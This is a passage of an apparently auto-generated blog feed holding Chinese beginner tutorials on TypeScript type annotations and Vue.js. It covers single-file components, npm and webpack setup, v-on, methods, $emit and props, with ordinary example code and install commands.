class="line"><span class="string">        `</span>;</span><br><span class="line">        tableBody?.<span class="title function_">appendChild</span>(tableRow);<span class="comment">//?表示如果为null就不添加子元素</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到我们对这个方法进行了类型标注，这个类型标注表示我们这个函数的返回值类型。</p><h2 id="数组">数组</h2><p>一般而言，对数组进行类型标注是标注数组内数据的类型</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">numArr</span>: <span class="built_in">number</span>[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>如果我们需要在数组内放对象，我们会通过编写一个接口，把对象的类型写在接口内</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Cat</span> &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">ObjArr</span>:<span class="title class_">Cat</span>[] = [&#123;&#125;]</span><br></pre></td></tr></table></figure><h2 id="事件监听">事件监听</h2><p>现在我们需要监听button点击事件，以触发我们的新增函数，我们直接用到<code>addEventListener</code>即可</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">button?<span class="comment">/*与前面加?原因一致*/</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, getData)</span><br></pre></td></tr></table></figure><p>我们可以在监听事件处注明事件类型，以便于我们检查我们的事件是否有错误，即使用尖括号在事件再标注一次事件类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">button?.addEventListener&lt;&#x27;click&#x27;&gt;(&#x27;click&#x27;, getData);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuejs开发入门（7）：Vue项目组成逻辑</title>
      <link href="/2023/03/27/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%887%EF%BC%89%EF%BC%9A%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6%E3%80%81Vue%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90%E9%80%BB%E8%BE%91/"/>
      <url>/2023/03/27/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%887%EF%BC%89%EF%BC%9A%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6%E3%80%81Vue%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h2 id="vue的项目逻辑">Vue的项目逻辑</h2><p>为了更深刻了解Vue的项目逻辑，我们可以尝试不使用脚手架搭建一次Vue项目。</p><h3 id="单文件组件">单文件组件</h3><p>Vue的单文件组件（即<code>.vue</code>文件，英文 Single-File Component，简称 <strong>SFC</strong>），是把Vue组件（模板template、逻辑script、样式style）封装在同一个文件的格式。封装在一个文件内方便对多组件项目进行管理。</p><p>它常见的格式如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">//页面逻辑</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!--HTML模板--&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">/*CSS样式*/</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>Vue 的单文件组件是网页开发中 HTML、CSS 和 JavaScript 三种语言经典组合的自然延伸。</p><h3 id="main-js">main.js</h3><p>我们编写完我们的单文件组件后，我们还需要编写一个mian.js，以用来注册单文件组件以及挂载单文件组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然而我们发现，我们目前整个项目都不存在vue框架代码。因此我们需要将vuejs下载下来，为了方便我们的项目管理的，我们会使用到npm。</p><h3 id="npm">npm</h3><p>npm是包管理器，可以使得我们很方便轻松管理我们的框架、第三方库等，也就是所谓的“依赖”。</p><p>使用<code>npm init -y</code>在当前项目文件夹中初始化一个<code>package.json</code>，这个文件是npm包管理器的核心文件，里面包含了我们项目所需要的依赖、项目的运行脚本等信息</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vue-project-stru&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>接下来我们使用<code>npm install vue</code>安装我们的vue到本地，然后我们会发现多了一个文件<code>package-lock.json</code>，而这个文件记录的是我们依赖的详细信息，以保证不同人开发该项目时，使用依赖版本的一致性。</p><p>我们还发现多了一个node_modules文件夹，这个文件夹存放的就是我们刚刚下载下来的依赖。</p><h3 id="各种依赖">各种依赖</h3><p><strong>Webpack</strong></p><p>当我们项目的源文件越来越多，我们就需要用到Webpack对项目进行打包了。在使用Webpack之前，我们将我们之前手动创建那几个文件放入新建的<code>src</code>文件夹中。</p><p><img src="https://image.icewindy.cn/202303272320087.png" alt="image-20230327232007066"></p><p>接着我们需要安装Webpack，包括三个库webpack(本体)、webpack-cli(命令)、webpack-dev-server(live Server功能)。<code>-D</code>代表仅开发环境的依赖，打包交付时不需要使用，<code>i</code>为<code>install</code>的缩写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D webpack webpack-cli webpack-dev-server</span><br></pre></td></tr></table></figure><p><strong>Babel</strong></p><p>由于不是所有浏览器都支持ES6的语法，因此我们需要使用<code>Babel</code>来将高版本转换为低版本的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D babel-loader @babel/core @babel/preset-env</span><br></pre></td></tr></table></figure><p><strong>把各种文件转换为浏览器能识别的合成文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D vue-loader css-loader vue-style-loader vue-template-compiler html-webpack-plugin</span><br></pre></td></tr></table></figure><p>这几个依赖都是使得浏览器可以识别我们的Vue单文件组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D html-webpack-plugin</span><br></pre></td></tr></table></figure><p>这个依赖是将各种文件（js、html…）打包到一个html内，使得浏览器能正常运行</p><h3 id="配置webpack">配置webpack</h3><p>接下来还是看视频吧，实在是太麻烦了（脚手架是个好东西。。。）</p><p>【Vue项目组成逻辑 | 文件关系和作用】 <a href="https://www.bilibili.com/video/BV1dt4y1K7BF/?share_source=copy_web&amp;vd_source=09bd1be8229f31f9b1fe4359ac7315ac">https://www.bilibili.com/video/BV1dt4y1K7BF/?share_source=copy_web&amp;vd_source=09bd1be8229f31f9b1fe4359ac7315ac</a></p><h2 id="脚手架">脚手架</h2><p>我们使用vue官方提供的脚手架搭建vue项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init vue@latest</span><br></pre></td></tr></table></figure><p>搭建完成后我们看目录</p><p><img src="https://image.icewindy.cn/202303272353610.png" alt="image-20230327235337580"></p><ul><li>public ---- 公共资源目录</li><li>src ---- 源文件目录</li><li>index.html ---- 主页</li><li>package.json、package-lock.json ---- npm项目核心文件</li><li><a href="http://README.md">README.md</a></li><li>vite.config.js ---- webpack打包配置</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> Vuejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Vuejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuejs开发入门（6）：v-on、methods、$emit</title>
      <link href="/2023/03/27/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%886%EF%BC%89%EF%BC%9Av-on%E3%80%81methods%E3%80%81$emit/"/>
      <url>/2023/03/27/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%886%EF%BC%89%EF%BC%9Av-on%E3%80%81methods%E3%80%81$emit/</url>
      
        <content type="html"><![CDATA[<p>我们这里继续使用蛋老师的例子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -f 06-start</span><br></pre></td></tr></table></figure><h2 id="v-on">v-on</h2><p>v-on用于监听事件。在日常的开发中，常常会缩写成<code>@</code>，后面不需要加<code>:</code></p><p>现在我们想要在网页上通过输入框和添加按钮新增一行我们不同口味的鱿鱼丝，这时候我们就用到了v-on，使用v-on在按钮处监听点击submit事件，然后再对事件进行处理。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit</span>=<span class="string">&quot;处理方法&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入爱吃的鱿鱼丝...&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么这里处理方法我们应该如何添加呢，这时候就用到了在createApp中与computed等同级的属性methods</p><h2 id="methods">methods</h2><p><code>methods</code>与<code>computed</code>都可以用来定义组件中的方法，但它们的使用场景和行为略有不同。</p><p><code>computed</code>是一个计算属性，用于根据响应式依赖进行计算和缓存结果。计算属性通常用于对状态数据进行处理和转换，返回一个新的值，这个新值会被缓存，只有当依赖的响应式数据发生变化时才会重新计算。</p><p><code>methods</code>定义的方法则是普通的函数，每次调用都会执行一次。在方法中可以进行复杂的逻辑操作，但是它们不会像计算属性那样被缓存，每次调用都会重新计算。</p><p>简单来说：methods是触发型的，computed是缓存好的。</p><p>现在我们需要添加一个method方法来处理点击添加后的相关处理：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="property">length</span>++,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="attr">image</span>: <span class="string">&#x27;./images/原味鱿鱼丝.png&#x27;</span>,</span><br><span class="line">            <span class="attr">purchased</span>: <span class="literal">false</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>然后我们会发现点击后，页面就自动刷新了，我们新增的零食也没了。这时候我们需要使用到<code>prevent</code>对事件响应后发生的自动刷新给禁用掉，在我们监听器处添加</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit.prevent</span>=<span class="string">&quot;add&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>现在我们需要获取到输入框内的内容，我们就需要用到前面提及的<code>v-model</code>对数据进行双向绑定。</p><p>我们首先要在data()内新建一个newFood的空字符串，用于存储我们的临时数据，然后用v-model绑定上这个临时数据，最后完善我们的methods，使得加入数组的数据使用获取到的信息，使用完临时数据后，记得清除数据</p><p>以下是整个AppSections的完整代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">AppSectionsList</span> <span class="keyword">from</span> <span class="string">&quot;./AppSectionsList.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">components</span>: &#123; <span class="title class_">AppSectionsList</span> &#125;,</span><br><span class="line">    <span class="attr">template</span>: <span class="comment">/*html*/</span> <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;app-sections-list headline=&quot;未购零食&quot; :buyChild=&quot;filters.beforeBuy&quot;&gt;&lt;/app-sections-list&gt;</span></span><br><span class="line"><span class="string">        &lt;app-sections-list headline=&quot;已购零食&quot; :buyChild=&quot;filters.afterBuy&quot;&gt;&lt;/app-sections-list&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;form @submit.prevent=&quot;add&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; placeholder=&quot;输入爱吃的鱿鱼丝...&quot; v-model=&quot;newFood&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;button type=&quot;submit&quot;&gt;添加&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">foods</span>: [</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;原味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/原味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;辣味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/辣味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;炭烧味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/炭烧味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">newFood</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>:&#123;</span><br><span class="line">        <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">id</span>: <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="property">length</span>++,</span><br><span class="line">                <span class="attr">name</span>: <span class="variable language_">this</span>.<span class="property">newFood</span>,</span><br><span class="line">                <span class="attr">image</span>: <span class="string">&#x27;./images/原味鱿鱼丝.png&#x27;</span>,</span><br><span class="line">                <span class="attr">purchased</span>: <span class="literal">false</span></span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">newFood</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">computed</span>: &#123;</span><br><span class="line">        <span class="title function_">filters</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">beforeBuy</span>: <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !item.<span class="property">purchased</span>),</span><br><span class="line">                <span class="attr">afterBuy</span>: <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">purchased</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="emit">$emit</h2><p><code>$emit</code>是一个实例方法，用于触发当前实例上的自定义事件。使用 <code>$emit</code> 方法，可以在一个组件中触发一个自定义事件，从而通知其他组件监听该事件，并执行相应的逻辑。</p><p><code>$emit</code> 方法接受两个参数，第一个参数是需要触发的事件名称，第二个参数是要传递给监听函数的参数。</p><p>根据我们上面的例子，我现在想将表单拆分成一个新的组件。由于foods为父组件的数据，如果将add方法放在新的组件里面，将无法对数据进行操纵，因此我们需要将add方法放在父组件，然后通过<code>$emit</code>向父组件传递我们得到的<code>newFood</code>，让父组件去执行操作数据的方法</p><p>因此，我们代码应该这么改</p><p>父组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">AppSectionsList</span> <span class="keyword">from</span> <span class="string">&quot;./AppSectionsList.js&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">AppSectionsForm</span> <span class="keyword">from</span> <span class="string">&quot;./AppSectionsForm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">components</span>: &#123;<span class="title class_">AppSectionsForm</span>, <span class="title class_">AppSectionsList</span> &#125;,</span><br><span class="line">    <span class="attr">template</span>: <span class="comment">/*html*/</span> <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;app-sections-list headline=&quot;未购零食&quot; :buyChild=&quot;filters.beforeBuy&quot;&gt;&lt;/app-sections-list&gt;</span></span><br><span class="line"><span class="string">        &lt;app-sections-list headline=&quot;已购零食&quot; :buyChild=&quot;filters.afterBuy&quot;&gt;&lt;/app-sections-list&gt;</span></span><br><span class="line"><span class="string">        &lt;app-sections-form @add=&quot;add&quot;&gt;&lt;/app-sections-form&gt; &lt;!--当接收到add事件，触发add方法--&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">foods</span>: [</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;原味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/原味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;辣味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/辣味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;炭烧味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/炭烧味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;</span><br><span class="line">            ],</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="title function_">add</span>(<span class="params">newFood</span>) &#123; <span class="comment">//接收子组件的newFood</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">id</span>: <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="property">length</span> + <span class="number">1</span>,</span><br><span class="line">                <span class="attr">name</span>: newFood, <span class="comment">//使用传进来的newFood</span></span><br><span class="line">                <span class="attr">image</span>: <span class="string">&#x27;../images/鱿鱼丝.png&#x27;</span>,</span><br><span class="line">                <span class="attr">purchased</span>: <span class="literal">false</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">computed</span>: &#123;</span><br><span class="line">        <span class="title function_">filters</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">beforeBuy</span>: <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !item.<span class="property">purchased</span>),</span><br><span class="line">                <span class="attr">afterBuy</span>: <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">purchased</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="comment">/*html*/</span><span class="string">`</span></span><br><span class="line"><span class="string">        &lt;form @submit.prevent=&quot;add&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; placeholder=&quot;输入爱吃的鱿鱼丝...&quot; v-model=&quot;newFood&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;button type=&quot;submit&quot;&gt;添加&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">newFood</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.$emit(<span class="string">&#x27;add&#x27;</span>, <span class="variable language_">this</span>.<span class="property">newFood</span>); <span class="comment">//发出add事件，并向外传递newFood</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">newFood</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看出</p><ul><li>props由父组件向子组件传递</li><li>$emit由子组件向父组件传递</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> Vuejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Vuejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuejs开发入门（5）：props</title>
      <link href="/2023/03/26/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%885%EF%BC%89%EF%BC%9Aprops/"/>
      <url>/2023/03/26/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%885%EF%BC%89%EF%BC%9Aprops/</url>
      
        <content type="html"><![CDATA[<h2 id="props">props</h2><p>props简单来说就是向组件中传递数据。很多时候，我们都有类似的需求：我们正在构建一个博客，我们可能需要一个表示博客文章的组件。我们希望所有的博客文章分享相同的视觉布局，但有不同的内容。要实现这样的效果自然必须向组件中传递数据，例如每篇文章标题和内容，这就会使用到 props。</p><p>假如我们需要传递给我们博客文章一个标题，我们需要在组件<code>template</code>同级的属性<code>props</code>中声明</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="comment">/*html*/</span><span class="string">`</span></span><br><span class="line"><span class="string">        &lt;h4&gt; &#123;&#123;title&#125;&#125; &lt;/h4&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">props</span>: &#123;</span><br><span class="line">        <span class="attr">title</span>: <span class="title class_">String</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们可以在父组件这样写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 